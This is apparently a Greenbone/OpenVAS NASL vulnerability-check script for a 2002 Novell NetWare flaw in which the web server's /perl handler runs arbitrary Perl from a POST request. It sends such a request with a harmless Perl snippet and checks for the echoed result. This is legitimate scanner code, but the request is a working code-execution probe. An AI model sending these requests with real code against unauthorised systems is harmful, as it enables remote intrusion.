# SPDX-FileCopyrightText: 2002 visigoth
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11158");
  script_version("2023-08-01T13:29:10+0000");
  script_tag(name:"last_modification", value:"2023-08-01 13:29:10 +0000 (Tue, 01 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/5520");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/5521");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/5522");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2002-1436", "CVE-2002-1437", "CVE-2002-1438");
  script_name("Novell NetWare HTTP POST Perl Code Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2002 visigoth");
  script_family("Web Servers");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80, 2200);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Install 5.x SP5 or 6.0 SP2.

  Additionally, the enterprise manager web interface may be used to
  unmap the /perl handler entirely. If it is not being used, minimizing
  this service would be appropriate.");

  script_tag(name:"summary", value:"Novell Netware contains multiple default web server installations.");

  script_tag(name:"insight", value:"The Netware Enterprise Web Server (Netscape/IPlanet) has a perl handler
  which will run arbitrary code given to in a POST request version 5.x (through SP4) and 6.x (through SP1)
  are effected.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

host = http_host_name(port:port);
url = "/perl";
req = string("POST ", url, " HTTP/1.1\r\n",
             "Content-Type: application/octet-stream\r\n",
             "Host: ", host, "\r\n",
             "Content-Length: ");
perl_code = 'print("Content-Type: text/plain\\r\\n\\r\\n", "VT-Test=", 42+42);';

length = strlen(perl_code);
data = string(req, length ,"\r\n\r\n", perl_code);
rcv = http_keepalive_send_recv(port:port, data:data);
if(!rcv)
  exit(0);

if("VT-Test=84" >< rcv) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
